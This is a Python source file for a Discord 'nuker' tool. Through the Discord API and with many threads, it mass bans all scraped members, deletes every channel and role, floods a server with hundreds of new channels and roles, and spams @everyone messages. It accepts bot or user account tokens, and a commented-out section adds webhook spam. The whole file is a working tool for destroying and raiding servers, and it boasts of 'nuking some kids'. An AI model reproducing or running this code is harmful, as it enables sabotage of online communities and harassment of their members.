import os
import time
import sys
from datetime import datetime
import threading
import random
import json
import requests
import discord
import datetime
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
import aiohttp
import asyncio
from os import system, name
from pypresence import Presence
###############################################################
async def clear():
  
    time.sleep(1)
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')
###############################################################
rpc_state = False
if name == 'nt':
  rpc_state = True
with open("config.json") as f:
	configg = json.load(f)

if rpc_state:
  CLient_id = '860122721325285397'
  RPC = Presence(CLient_id) 
  RPC.connect()
  RPC.update(details="nuking some kids", state='gojo nuker = best nuker', small_image='gojo_1_', large_image='goho_nuker', buttons=[{"label": "violent range", "url": "https://discord.gg/wJEav7g773"}])

token_config = configg.get("Token_config")
channel_names_config = configg.get("Channel_Names_Config")
role_names_config = configg.get("Role_Names_config")
msg_Config = configg.get("msg_Config")
if token_config:
  token = configg.get("Token")
else:
  token = input(f'\033[38;5;195m enter token >> ')
###############################################################
###############################################################
intents = discord.Intents.all()
intents.members = True
menu_logo = f'''  
                        \033[38;5;5m  ▄████  ▒█████   ▄▄▄██▀▀▀▒█████  
                        \033[38;5;13m ██▒ ▀█▒▒██▒  ██▒   ▒██  ▒██▒  ██▒
                        \033[38;5;212m▒██░▄▄▄░▒██░  ██▒   ░██  ▒██░  ██▒
                        \033[38;5;218m░▓█  ██▓▒██   ██░▓██▄██▓ ▒██   ██░
                        \033[38;5;219m░▒▓███▀▒░ ████▓▒░ ▓███▒  ░ ████▓▒░
                        \033[38;5;213m ░▒   ▒ ░ ▒░▒░▒░  ▒▓▒▒░  ░ ▒░▒░▒░ 
                        \033[38;5;218m  ░   ░   ░ ▒ ▒░  ▒ ░▒░    ░ ▒ ▒░ 
                        \033[38;5;218m░ ░   ░ ░ ░ ░ ▒   ░ ░ ░  ░ ░ ░ ▒  
                        \033[38;5;219m      ░     ░ ░   ░   ░      ░ ░  
                                  '''
menu_opt = '''              
                ╔═════════════════════════════════════════════════╗
                |[1]  mass ban         [2]  mass role             |
                |[3]  mass role delete [4]  scrape                |
                |[5]  mass channels    [6]  mass channels delete  |
                |[7]  nuke             [8]  mass ping             |
                ╚═════════════════════════════════════════════════╝''' 
if name == 'nt':
  _ = system('cls')
  os.system(f'cls & mode 85,20 ')
  print(menu_logo)
  os.system('title g')
  time.sleep(0.05)
  os.system('title go')
  time.sleep(0.05)
  os.system('title goj')
  time.sleep(0.05)
  os.system('title gojo')
  time.sleep(0.05)
  os.system('title gojo n')
  time.sleep(0.05)
  os.system('title gojo nu')
  os.system('title gojo nuk')
  time.sleep(0.05)
  os.system('title gojo nuke')
  time.sleep(0.05)
  os.system('title gojo nuker') 
  time.sleep(0.05)
  os.system('title gojo nuker = ') 
  time.sleep(0.05)
  os.system('title gojo nuker = b') 
  time.sleep(0.05)
  os.system('title gojo nuker = be') 
  time.sleep(0.05)
  os.system('title gojo nuker = bes') 
  time.sleep(0.05)
  os.system('title gojo nuker = best')
  time.sleep(0.05)
  os.system('title gojo nuker = best n')  
  time.sleep(0.05)
  os.system('title gojo nuker = best nu') 
  time.sleep(0.05)
  os.system('title gojo nuker = best nuk')  
  time.sleep(0.05)
  os.system('title gojo nuker = best nuke') 
  time.sleep(0.05)
  os.system('title gojo nuker = best nuker') 

else:
  _ = system('clear')
  print(menu_logo) 

client = discord.Client(command_prefix=">", intents=intents)
s = requests.Session()
txt = open('gojo/members.txt')
roles_ids = open('gojo/roles.txt')
guild_id = int(input(f'\033[38;5;195mguild id >> '))
guild = guild_id
chupapi = input(f'\033[38;5;195mAre you using a Bot-Token(enter yes or no)?>> ')
if chupapi == "yes":
    munanyo = "BOT_TOKEN"
elif chupapi == "no":
    munanyo = "HUMAN_TOKEN"
while chupapi !="no" and chupapi != "yes":
    print(f'\033[38;5;161mInvalid option\nPlease Enter yes or no')
    chupapi = input('Are you using a Bot-Token(enter yes or no)?>> ')
if chupapi == "yes":
    munanyo = "BOT_TOKEN"
elif chupapi == "no":
    munanyo = "HUMAN_TOKEN"
if chupapi == 'yes':
	headers = {
	  "Authorization": f"Bot {token}"
	}
	client = commands.Bot(command_prefix='!',  intents=discord.Intents.all(), help_command=None)

else:
	headers = {
	  "Authorization": token
	}
	client = discord.Client(command_prefix=">", intents=intents)
###############################################################
###############################################################

###############################################################
###############################################################
def mass_ban_ids(guild, users):
  mb = s.put(f"https://discord.com/api/v9/guilds/{guild_id}/bans/{users}", headers=headers)
  if mb.status_code in [200, 201, 204]:
    print(f"\033[38;5;77m[+] banned {users}")

  else:
    print(f"\033[38;5;160m[-] ratelimted")
    time.sleep(0.8)
"""     def mass_webhook_spammer(msg):
  spaming = ['@everyone vilont owns me', msg, msg, msg]
  json = {
    'content': random.choice(spaming),
    "tts": False
  }  
  webhook_urll = open('itadori/webhooks.txt', 'r')
  webhook_urls = webhook_urll.read().split()
  webhook_url = random.choice(webhook_urls)
  mw = s.post(webhook, headers=headers, json=json)
  if mw.status_code == 204:
    print(f'spamed {random.choice(spaming)}')
  else:
    print('ratelimit')
async def threds_mass_webhook_spam():
  msg = str(input('enter a messege you would like to spam'))
  try:
    for i in range(1000):
      threading.Thread(target=mass_webhook_spammer, args=[msg]).start()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu() """
###############################################################
""" async def mass_webhook():
  json = {
    'name': 'itadori nuker made by (gohan_chan#8384)'
  }
  channel_idss = open('itadori/channels.txt', 'r')
  channel_ids = channel_idss.read().split()
  channel_id = random.choice(channel_ids)
  for i in range(124):
    channel_id = random.choice(channel_ids)
    mws = requests.post(f'https://discord.com/api/v9/channels/{channel_id}/webhooks', headers=headers, json=json)
    if mws.status_code in [200, 201, 204]:
      print(f'created a webhhok ')
      web_nigg = ["{}".format(mws.url[:52])]
      print(mws.url)
      mwss = s.post(random.choice(web_nigg), headers=headers, json={"content": '@here', "name": 'itadori webhook spammer', "avatar_url": "https://i.imgur.com/eSLUiBm.png"})
      if mwss.status_code in [200, 201, 204]:
        print(f'created a webhhok ')
      elif mwss.status_code in [404, 500]:
        print('ratelimt') 
    elif mws.status_code in [404, 500]:
      print('ratelimt')

   

    guildOBJ = client.get_guild(int(guild_id))
    members = await guildOBJ.chunk()
    channel_idss = open('itadori/channels.txt', 'r')
    channel_ids = channel_idss.read().split()
    with open('itadori/webhooks.txt', 'a') as w:
        
        channel_id = random.choice(channel_ids)
        w.write(str(mws.url) + "\n")
        
        w.close() """
###############################################################
def mass_bot_pings(msg, chan_id):
  spaming = ['@everyone אם ניוקר זה שומש לרעה ובלי סיבה מוזמנים לפנות אילנו https://discord.gg/wJEav7g773', msg, msg, msg]
  json = {
    'content': random.choice(spaming),
    "tts": False,
  }

  mbp = s.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', headers=headers, json=json)
  if mbp.status_code in [200, 201, 204]:
    print(f'\033[38;5;77m[+] spammed {random.choice(spaming)} ')
  else:
    print('\033[38;5;160m[-] ratelimted')
######################
###############################################################
###############################################################
def mass_role(role_name):
  json = {
    'name': role_name,
    'mentionable': True,
    'color': 11561407,
    'permissions': "66321471",
    'managed': True,
    'hoist': True,
    'reason': 'gojo nuker on top'
  }
  mcr = s.post(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers, json=json)
  if mcr.status_code in [200, 201, 204]:
    print(f'\033[38;5;77m[+] created role named {role_name} ')
  elif mcr.status_code in [404, 500]:
    print('\033[38;5;160m[-] ratelimted')
    time.sleep(0.8)
  else:
    print('\033[38;5;160m[-] ratelimted')
    time.sleep(0.8)
###############################################################

###############################################################
def mass_chanels(channels_name):
  json = {'name': channels_name}
  mcc = s.post(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers, json=json)
  if mcc.status_code in [200, 201, 204]:
    print(f'\033[38;5;77m[+] created channel named {channels_name}')
  else:
    print('\033[38;5;160m[-] ratelimted')
    time.sleep(0.8)
###############################################################
###############################################################
def mass_delete_chanels(channel_id):
  mdc = s.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
  if mdc.status_code in [200, 201, 204]:
    print('\033[38;5;77m[+] channle deleted')
  else:
    print(f"\033[38;5;160m[-] ratelimted")


###############################################################
###############################################################
async def nuke():
  try:
    member_ids = open('gojo/members.txt', 'r')
    channel_idss = open('gojo/channels.txt', 'r')
    roles_idss = open('gojo/roles.txt', 'r')
    channel_ids = channel_idss.read().split()
    roles_ids = roles_idss.read().split()
    txt = member_ids.read().split()
    threads = []
    if role_names_config:
      role_names = configg.get("Role_Names")
      role_name = random.choice(role_names)
    else:
      role_name = input(f'\033[38;5;195m enter name >> ')
    if msg_Config:
      msgg = configg.get("msg")
      msg = random.choice(msgg)
    else:
      msg = input(f'\033[38;5;195m enter spam messge >> ')
    if channel_names_config:
      channels_namee = configg.get("Channel_Names")
      channels_name = random.choice(channels_namee)
    else:
      channels_name = input(f'\033[38;5;195m enter channels name >> ')
    for i in range(4):
      for users in list(txt):
        tb = threading.Thread(target=mass_ban_ids, args=[guild, users], ).start()
    for i in range(4):
      for channel_id in list(channel_ids):
        threading.Thread(target=mass_delete_chanels, args=[channel_id]).start()
    for i in range(4):
      for role in roles_ids:
        threads = []
        trd = threading.Thread(target=mass_role_delete, args=[role]).start()   
    for i in range(430):
      tr = threading.Thread(target=mass_chanels, args=[channels_name]).start()
    for i in range(230):
      tr = threading.Thread(target=mass_role, args=[role_name]).start()
    for i in range(130):
      channel_ids = open('gojo/channels.txt', 'r')
      chan_idss = channel_ids.read().split()
      await Scrape_ping()
      for chan_id in list(chan_idss):
        threading.Thread(target=mass_bot_pings, args=[msg, chan_id]).start()
    for thread in threads:
      thread.join()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()
###############################################################
###############################################################
def mass_role_delete(role):
  mrd = s.delete(f'https://discord.com/api/v9/guilds/{guild_id}/roles/{role}', headers=headers)
  if mrd.status_code in [200, 201, 204]:
    print('\033[38;5;77m[+] role deleted')
  elif mrd.status_code in [404, 500]:
    print('\033[38;5;160m[-] ratelimted')
    time.sleep(0.8)
  else:
    print('\033[38;5;160m[-] ratelimted')
    time.sleep(0.8)


###############################################################
###############################################################
async def mass_channels_delete_threds():
  try:
    channel_idss = open('gojo/channels.txt', 'r')
    channel_ids = channel_idss.read().split()
    for i in range(4):
      for channel_id in list(channel_ids):
        threads = []
        threading.Thread(target=mass_delete_chanels, args=[channel_id]).start()
    for thread in threads:
      thread.join()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()

###############################################################
###############################################################
async def mass_bot_pings_threds():
  if msg_Config:
    msgg = configg.get("msg")
    msg = random.choice(msgg)
  else:
    msg = input(f'\033[38;5;195m enter spam messge >> ')
  await Scrape_ping()
  try:
    channel_ids = open('gojo/channels.txt', 'r')
    chan_idss = channel_ids.read().split()
    for i in range(40):
      for chan_id in list(chan_idss):
        threading.Thread(target=mass_bot_pings, args=[msg, chan_id]).start()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()



###############################################################
###############################################################
async def mass_channels_threds():
  if channel_names_config:
    channels_namee = configg.get("Channel_Names")
  else:
    channels_name = input(f'\033[38;5;195m enter channels name >> ')
  for i in range(350):
    threads = []
    tr = threading.Thread(target=mass_chanels, args=[channels_name]).start()
  for thread in threads:
    thread.join()
  time.sleep(20)
  await menu()
      
###############################################################
###############################################################
async def mass_role_delete_threds():
  roles_idss = open('gojo/roles.txt', 'r')
  roles_ids = roles_idss.read().split()
  try:
    for i in range(4):
      for role in roles_ids:
        threads = []
        trd = threading.Thread(target=mass_role_delete, args=[role]).start()
    for thread in threads:
      thread.join()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()

      
###############################################################
###############################################################
async def mass_role_threds():
  if role_names_config:
    role_names = configg.get("Role_Names")
    role_name = random.choice(role_names)
  else:
    role_name = input(f'\033[38;5;195m enter name >> ')
  amount_role_spam = int(input(f'\033[38;5;195m enter spam amount >> '))
  try:
    if amount_role_spam > 249:
      amount_role_spam = 249
    for i in range(amount_role_spam):
      tr = threading.Thread(target=mass_role, args=[role_name]).start()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()
      
###############################################################
###############################################################
async def mass_ban_ids_threds():
  try:
    for i in range(4):

      member_ids = open('gojo/members.txt', 'r')
      txt = member_ids.read().split()
      for users in list(txt):
        threads = []
        tb = threading.Thread(target=mass_ban_ids, args=[guild, users], ).start()
    await clear()
    await menu()
  except Exception as error:
    await clear()
    await menu()

  

       
###############################################################
###############################################################
async def Scrape():
    
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild_id))
    members = await guildOBJ.chunk()

    try:
        os.remove("gojo/members.txt")
        os.remove("gojo/channels.txt")
        os.remove("gojo/roles.txt")
    except:
        pass

    membercount = 0
    with open('gojo/members.txt', 'a') as m:
        for member in members:
            m.write(str(member.id) + "\n")
            membercount += 1
        
        m.close()

    channelcount = 0
    with open('gojo/channels.txt', 'a') as c:
        for channel in guildOBJ.channels:
            c.write(str(channel.id) + "\n")
            channelcount += 1
        
        c.close()

    rolecount = 0
    with open('gojo/roles.txt', 'a') as r:
        for role in guildOBJ.roles:
            r.write(str(role.id) + "\n")
            rolecount += 1
        
        r.close()
        print(f'scraped {membercount} members {channelcount} channels {rolecount} roles')
        await menu()
###############################################################
###############################################################
async def Scrape_ping():
    
    await client.wait_until_ready()
    guildOBJ = client.get_guild(int(guild_id))
    members = await guildOBJ.chunk()

    try:
        os.remove("gojo/channels.txt")
    except:
        pass

    channelcount = 0
    with open('gojo/channels.txt', 'a') as c:
        for channel in guildOBJ.channels:
            c.write(str(channel.id) + "\n")
            channelcount += 1
        
        c.close()



        
###############################################################
     
###############################################################

async def menu():
  await clear()

  print(menu_logo)
  print(menu_opt)
  opt = input('[>] select: ')
  if opt == '1':
    await mass_ban_ids_threds()

  elif opt == '2':
    await mass_role_threds()

  elif opt == '3':
    await mass_role_delete_threds()
  elif opt == '4':
    await Scrape()
  elif opt == '5':
    await mass_channels_threds()
  elif opt == '6':
    await mass_channels_delete_threds()
  elif opt == '7':
    await nuke()
  elif opt == '8':
    await Scrape_ping()
    await mass_bot_pings_threds()
  else:
    await clear()
    await menu()


@client.event
async def on_ready():
  await menu()


if munanyo == "HUMAN_TOKEN":
    client.run(token, bot=False) # runs the human-token if human-token was selected
elif munanyo == "BOT_TOKEN":
    client.run(token, bot=True) # runs the bot-token if bot-token was selected
